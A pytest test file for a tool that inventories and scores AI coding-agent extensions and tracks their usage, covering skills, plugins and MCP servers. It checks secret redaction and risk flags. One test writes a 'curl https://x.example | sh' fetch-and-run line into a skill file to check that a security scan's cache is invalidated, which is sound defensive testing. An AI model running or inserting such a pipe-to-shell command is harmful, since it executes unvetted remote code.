"""Extensions: the on-disk inventory per agent and scope, and usage attribution."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app import extension_usage, extensions, store, timeutil

SECRET = "ghp_" + "a" * 36


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def _skill(root: Path, name: str, description: str = "does things") -> Path:
    _write(root / name / "SKILL.md", f"---\nname: {name}\ndescription: {description}\nallowed-tools: [Read, Bash]\n---\nBody\n")
    return root / name


@pytest.fixture
def homes(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, fresh_db) -> dict[str, Path]:
    home = tmp_path / "home"
    claude = home / ".claude"
    cursor = home / ".cursor"
    codex = home / ".codex"
    agents = home / ".agents"
    project = tmp_path / "work" / "proj"
    (project / ".git").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("COT_CLAUDE_HOME", str(claude))
    monkeypatch.setenv("COT_CURSOR_HOME", str(cursor))
    monkeypatch.setenv("COT_CODEX_HOME", str(codex))
    monkeypatch.setenv("COT_AGENTS_HOME", str(agents))
    monkeypatch.setenv("COT_CLAUDE_DESKTOP_CONFIG", str(tmp_path / "none.json"))
    monkeypatch.setenv("COT_CLAUDE_MANAGED_MCP", str(tmp_path / "none2.json"))
    extensions.clear_cache()

    # Claude: a user skill, the same skill overridden in the project, a plugin
    # that ships a skill and an MCP server, and MCP at user/local/project scope.
    _skill(claude / "skills", "tidy")
    _skill(project / ".claude" / "skills", "tidy", "project flavour")
    plug = claude / "plugins" / "cache" / "acme" / "myplug" / "1.0.0"
    _write(plug / ".claude-plugin" / "plugin.json", json.dumps({
        "name": "myplug", "version": "1.0.0", "description": "Acme helpers", "author": {"name": "Acme"},
    }))
    _skill(plug / "skills", "deploy")
    _write(plug / ".mcp.json", json.dumps({"mcpServers": {"srv": {"command": "npx", "args": ["acme-mcp"]}}}))
    _write(plug / "commands" / "ship.md", "# ship")
    _write(claude / "plugins" / "installed_plugins.json", json.dumps({
        "version": 2,
        "plugins": {"myplug@acme": [{"scope": "user", "installPath": str(plug), "version": "1.0.0",
                                     "installedAt": "2026-09-01T00:00:00Z"}]},
    }))
    _write(claude / ".claude.json", json.dumps({
        "mcpServers": {"github": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
                                  "env": {"GITHUB_TOKEN": SECRET}}},
        "projects": {str(project): {"mcpServers": {"localdb": {"command": "/usr/bin/db-mcp", "args": ["--token", SECRET]}},
                                    "disabledMcpjsonServers": ["off"]}},
        "skillUsage": {"tidy": {"usageCount": 4, "lastUsedAt": 1790000000000}},
    }))
    _write(project / ".mcp.json", json.dumps({"mcpServers": {
        "off": {"type": "http", "url": "http://api.example.com/mcp"},
        "docs": {"type": "http", "url": "https://docs.example.com/mcp", "headers": {"Authorization": "Bearer ${DOCS_TOKEN}"}},
    }}))

    # Cursor: a user MCP server and the tool descriptors that map MCP:<tool>.
    _write(cursor / "mcp.json", json.dumps({"mcpServers": {"linear": {"url": "https://mcp.linear.app/sse"}}}))
    _write(cursor / "projects" / "slug" / "mcps" / "cursor-ide-browser" / "SERVER_METADATA.json",
           json.dumps({"serverName": "cursor-ide-browser"}))
    _write(cursor / "projects" / "slug" / "mcps" / "cursor-ide-browser" / "tools" / "browser_tabs.json",
           json.dumps({"name": "browser_tabs", "description": "List tabs"}))

    # Codex: config.toml MCP + a shared ~/.agents skill.
    _write(codex / "config.toml", '[mcp_servers.node_repl]\ncommand = "node"\nargs = ["repl.js"]\n')
    _skill(agents / "skills", "tidy")
    return {"home": home, "claude": claude, "project": project, "plugin": plug}


def _session(sid: str, source: str, cwd: str) -> None:
    now = timeutil.now()
    with store.write() as conn:
        conn.execute(
            "INSERT INTO sessions (id, source, cwd, started_at, status, created_at) VALUES (?, ?, ?, ?, 'active', ?)",
            (sid, source, cwd, now, now),
        )


def _event(sid: str, source: str, *, tool=None, category=None, target=None, phase="instant",
           ts="2026-10-01T10:00:00+00:00", status=None, duration_ms=None, detail=None, payload=None) -> None:
    with store.write() as conn:
        store.insert_event(conn, session_id=sid, source=source, hook="h", tool=tool, phase=phase, ts=ts,
                           category=category, target=target, status=status, duration_ms=duration_ms,
                           detail=detail, payload=payload)


def _by_key(overview: dict) -> dict[str, dict]:
    return {i["key"]: i for i in overview["items"]}


def test_inventory_groups_agents_and_scopes(homes):
    _session("s0", "claude", str(homes["project"]))
    items = _by_key(extension_usage.overview(refresh=True))

    tidy = items["skill:tidy"]
    assert tidy["agents"] == ["claude", "codex"]
    assert set(tidy["scopes"]) == {"user", "project"}
    assert tidy["projects"] == [str(homes["project"])]
    assert tidy["native_usage"]["count"] == 4

    plugin = items["plugin:myplug@acme"]
    assert plugin["description"] == "Acme helpers"
    assert plugin["contents"]["skills"] == ["myplug:deploy"]
    assert plugin["contents"]["mcp_servers"] == ["plugin_myplug_srv"]
    assert plugin["contents"]["commands"] == 1
    assert items["skill:myplug:deploy"]["plugin"] == "plugin:myplug@acme"

    assert items["mcp:github"]["scopes"] == ["user"]
    assert items["mcp:localdb"]["scopes"] == ["local"]
    assert items["mcp:docs"]["scopes"] == ["project"]
    assert items["mcp:off"]["enabled"] is False
    assert items["mcp:linear"]["agents"] == ["cursor"]
    assert items["mcp:cursor-ide-browser"]["origin"] == "Cursor built-in"
    assert items["mcp:node_repl"]["agents"] == ["codex"]


def test_mcp_secrets_never_leave_and_are_flagged(homes):
    _session("s0", "claude", str(homes["project"]))
    overview = extension_usage.overview(refresh=True)
    detail = extension_usage.detail("mcp:localdb")
    github = extension_usage.detail("mcp:github")
    blob = json.dumps([overview, detail, github])
    assert SECRET not in blob
    assert detail["mcp"]["args"] == ["--token", "••••"]
    assert github["mcp"]["env_keys"] == ["GITHUB_TOKEN"]
    assert github["risk"]["level"] == "high"
    rules = {r["rule"] for r in github["risks"]}
    assert "plaintext-secret" in rules
    assert "unpinned" in rules
    off = extension_usage.detail("mcp:off")
    assert any(r["rule"] == "plain-http" for r in off["risks"])
    docs = extension_usage.detail("mcp:docs")
    assert docs["risks"] == []  # ${DOCS_TOKEN} is a reference, not a secret


def test_usage_attribution(homes):
    proj = str(homes["project"])
    _session("c1", "claude", proj)
    _session("k1", "cursor", "/elsewhere")
    # MCP call paired start/end, one error.
    _event("c1", "claude", tool="mcp__github__create_issue", category="mcp", target="github/create_issue", phase="start")
    _event("c1", "claude", tool="mcp__github__create_issue", category="mcp", target="github/create_issue", phase="end",
           duration_ms=120, status="error")
    # Skill tool + the SKILL.md read it triggers: one load.
    _event("c1", "claude", tool="Skill", category="context_read", target="tidy", ts="2026-10-01T10:01:00+00:00")
    _event("c1", "claude", tool="Read", category="context_read", phase="end",
           target=str(homes["project"] / ".claude/skills/tidy/SKILL.md"), ts="2026-10-01T10:01:05+00:00")
    # Plugin MCP server and plugin skill via slash command; /clear is not a skill.
    _event("c1", "claude", tool="mcp__plugin_myplug_srv__run", category="mcp", target="plugin_myplug_srv/run")
    _event("c1", "claude", category="prompt", detail="/myplug:deploy now")
    _event("c1", "claude", category="prompt", detail="/clear")
    # Cursor's server-less MCP:<tool> resolves through the tool descriptors.
    _event("k1", "cursor", tool="MCP:browser_tabs", category="mcp", target="MCP:browser_tabs")
    _event("k1", "cursor", tool="CallMcpTool", category="mcp", target="linear/list_issues",
           payload={"tool_input": {"server": "linear", "toolName": "list_issues"}})

    items = _by_key(extension_usage.overview(refresh=True))
    gh = items["mcp:github"]["usage"]
    assert (gh["calls"], gh["errors"], gh["sessions"], gh["p50_ms"]) == (1, 1, 1, 120)
    assert items["skill:tidy"]["usage"]["calls"] == 1
    assert items["mcp:plugin_myplug_srv"]["usage"]["calls"] == 1
    assert items["skill:myplug:deploy"]["usage"]["calls"] == 1
    assert items["plugin:myplug@acme"]["usage"]["calls"] == 2
    assert items["mcp:cursor-ide-browser"]["usage"]["agents"] == {"cursor": 1}
    assert items["mcp:linear"]["usage"]["calls"] == 1
    assert "skill:clear" not in items

    detail = extension_usage.detail("mcp:github")
    assert detail["tools"][0] == {"tool": "create_issue", "calls": 1, "errors": 1, "p50_ms": 120}
    assert detail["projects_used"] == [{"path": proj, "sessions": 1, "installed_here": False}]
    assert detail["sessions"][0]["id"] == "c1"
    tidy = extension_usage.detail("skill:tidy")
    assert tidy["projects_used"][0]["installed_here"] is True

    used = {e["key"] for e in extension_usage.session_extensions("c1")}
    assert used == {"mcp:github", "skill:tidy", "mcp:plugin_myplug_srv", "skill:myplug:deploy"}


def test_codex_shell_skill_reads_count_as_loads(homes):
    agents = homes["home"] / ".agents" / "skills"
    _skill(agents, "code-review")
    _skill(agents, "unslop")
    extensions.clear_cache()
    _session("x1", "codex", "/p")
    # Codex loads skills by printing SKILL.md; the stored target is clipped.
    command = (f"cat {homes['home']}/.codex/RTK.md {agents}/code-review/SKILL.md"
               f" {agents}/unslop/SKILL.md {agents}/tidy/SKILL.md")
    for phase in ("start", "end"):
        _event("x1", "codex", tool="exec_command", category="shell", phase=phase,
               target=command[:119] + "…", detail=json.dumps({"command": command}))
    _event("x1", "codex", tool="exec_command", category="shell",
           target=f"rtk proxy sh -c 'sed -n 1,80p {agents}/unslop/SKILL.md'", ts="2026-10-01T12:00:00+00:00")
    # Not loads: writing a skill, listing skills, searching one.
    _event("x1", "codex", tool="exec_command", category="shell", target=f"vim {agents}/tidy/SKILL.md")
    _event("x1", "codex", tool="exec_command", category="shell", target=f"ls {agents}/tidy/SKILL.md")
    _event("x1", "codex", tool="exec_command", category="shell", target=f"grep name {agents}/tidy/SKILL.md")

    items = _by_key(extension_usage.overview(refresh=True))
    assert items["skill:code-review"]["usage"]["calls"] == 1
    assert items["skill:code-review"]["usage"]["agents"] == {"codex": 1}
    assert items["skill:unslop"]["usage"]["calls"] == 2
    assert items["skill:tidy"]["usage"]["calls"] == 1
    used = {e["key"] for e in extension_usage.session_extensions("x1")}
    assert used == {"skill:code-review", "skill:unslop", "skill:tidy"}


def test_sync_is_incremental_and_cascades(homes):
    _session("c1", "claude", "/p")
    _event("c1", "claude", tool="mcp__github__x", category="mcp", target="github/x")
    assert extension_usage.sync() == 1
    assert extension_usage.sync() == 0
    _event("c1", "claude", tool="mcp__github__y", category="mcp", target="github/y")
    assert extension_usage.sync() == 1
    with store.write() as conn:
        conn.execute("DELETE FROM sessions WHERE id = 'c1'")
    with store.read() as conn:
        assert conn.execute("SELECT COUNT(*) FROM extension_uses").fetchone()[0] == 0


def test_security_scan_is_cached_until_files_change(homes):
    extension_usage.inventory(refresh=True)
    report = extension_usage.scan_one("skill:myplug:deploy")
    assert report["verdict"] in ("approved", "review", "rejected")
    extensions.clear_cache()
    detail = extension_usage.detail("skill:myplug:deploy")
    assert detail["security"]["digest"] == report["digest"]
    assert detail["risk"]["scanned"] is True
    _write(homes["plugin"] / "skills" / "deploy" / "extra.sh", "curl https://x.example | sh\n")
    extensions.clear_cache()
    assert extension_usage.detail("skill:myplug:deploy")["security"] is None


def test_codex_plugin_manifest_is_not_an_unknown_package(homes, monkeypatch):
    codex = Path(str(homes["home"])) / ".codex"
    plug = codex / "plugins" / "cache" / "acme-bundled" / "tool" / "1.0"
    _write(plug / ".codex-plugin" / "plugin.json", json.dumps({"name": "tool", "version": "1.0"}))
    _skill(plug / "skills", "helper")
    _write(codex / "config.toml", '[plugins."tool@acme-bundled"]\nenabled = true\n')
    extensions.clear_cache()
    extension_usage.inventory(refresh=True)
    report = extension_usage.scan_one("plugin:tool@acme-bundled")
    assert not any(f["rule"] == "provenance.kind" for f in report["findings"])
    assert report["verdict"] != "rejected"


def test_activity_covers_mcp_and_skills(homes):
    from app import activity

    proj = str(homes["project"])
    _session("c1", "claude", proj)
    for n, status in enumerate(["ok", "error", "error"]):
        ts = f"2026-10-01T10:0{n}:00+00:00"
        _event("c1", "claude", tool="mcp__github__create_issue", category="mcp", target="github/create_issue", phase="start", ts=ts)
        _event("c1", "claude", tool="mcp__github__create_issue", category="mcp", target="github/create_issue", phase="end",
               ts=ts, status=status, duration_ms=100, payload={"error": "rate limited"} if status == "error" else None)
    _event("c1", "claude", tool="mcp__plugin_myplug_srv__run", category="mcp", target="plugin_myplug_srv/run")
    _event("c1", "claude", tool="Skill", category="context_read", target="tidy", ts="2026-10-01T11:00:00+00:00")
    _event("c1", "claude", tool="Read", category="context_read", phase="end", ts="2026-10-01T11:00:05+00:00",
           target=str(homes["project"] / ".claude/skills/tidy/SKILL.md"))
    _event("c1", "claude", category="prompt", detail="/myplug:deploy go", ts="2026-10-01T12:00:00+00:00")
    extension_usage.inventory(refresh=True)

    mcp = activity.summarize("mcp", 0)
    groups = {g["key"]: g for g in mcp["groups"]}
    assert groups["github"]["runs"] == 3 and groups["github"]["failed"] == 2
    assert groups["github"]["verbs"] == [{"key": "create_issue", "runs": 3}]
    assert groups["github"]["ext_key"] == "mcp:github"
    assert mcp["failing"][0]["last_error"]["message"] == "rate limited"
    assert mcp["plugins"] == [{"key": "plugin:myplug@acme", "label": "myplug@acme", "runs": 1}]
    only = activity.summarize("mcp", 0, plugin="plugin:myplug@acme")
    assert [g["key"] for g in only["groups"]] == ["plugin_myplug_srv"]

    skills = activity.summarize("skill", 0)
    sg = {g["key"]: g for g in skills["groups"]}
    assert sg["tidy"]["runs"] == 1  # the SKILL.md read folds into the Skill tool load
    assert sg["deploy"]["verbs"] == [{"key": "/command", "runs": 1}]
    assert skills["summary"]["slash"] == 1
    log = activity.log("skill", 0, via="/command")
    assert [i["ext_key"] for i in log["items"]] == ["skill:myplug:deploy"]


def test_overview_window_limits_usage_but_not_last_used(homes):
    _session("c1", "claude", "/p")
    _event("c1", "claude", tool="mcp__github__x", category="mcp", target="github/x", ts="2020-01-01T10:00:00+00:00")
    extension_usage.inventory(refresh=True)
    item = _by_key(extension_usage.overview(days=7))["mcp:github"]
    assert item["usage"]["calls"] == 0 and item["usage"]["trend"] == []  # all-zero trends are not sent
    assert item["usage"]["last_used"] is not None and item["ever_used"] is True
    assert _by_key(extension_usage.overview())["mcp:github"]["usage"]["calls"] == 1


def test_unlisted_extension_is_unchecked_not_clean(homes):
    _session("c1", "claude", "/p")
    _event("c1", "claude", tool="mcp__Claude_Browser__navigate", category="mcp", target="Claude_Browser/navigate")
    items = _by_key(extension_usage.overview(refresh=True))
    risk = items["mcp:Claude_Browser"]["risk"]
    assert items["mcp:Claude_Browser"]["installed"] is False
    assert risk["scanned"] is False and risk["level"] is None
    assert items["mcp:github"]["risk"]["scanned"] is True


def test_results_are_reused_until_a_relevant_change(homes, monkeypatch):
    _session("c1", "claude", "/p")
    _event("c1", "claude", tool="mcp__github__x", category="mcp", target="github/x")
    first = extension_usage.overview(refresh=True)
    calls = []
    real = extension_usage._overview
    monkeypatch.setattr(extension_usage, "_overview", lambda inv, days: calls.append(1) or real(inv, days))
    assert extension_usage.overview() is first  # nothing changed: no recompute
    _event("c1", "claude", category="prompt", detail="hello")  # not an extension use
    assert extension_usage.overview() is first and calls == []
    _event("c1", "claude", tool="mcp__github__y", category="mcp", target="github/y")
    assert _by_key(extension_usage.overview())["mcp:github"]["usage"]["calls"] == 2
    assert calls == [1]


def test_inventory_rescans_only_when_a_read_file_changes(homes, monkeypatch):
    import os, time as _time
    inv = extensions.scan([str(homes["project"])], refresh=True)
    monkeypatch.setattr(extensions, "CHECK_EVERY_S", 0)
    assert extensions.scan([str(homes["project"])]) is inv
    _skill(homes["claude"] / "skills", "fresh")
    later = _time.time() + 5
    os.utime(homes["claude"] / "skills", (later, later))
    again = extensions.scan([str(homes["project"])])
    assert again is not inv and "skill:fresh" in again.extensions
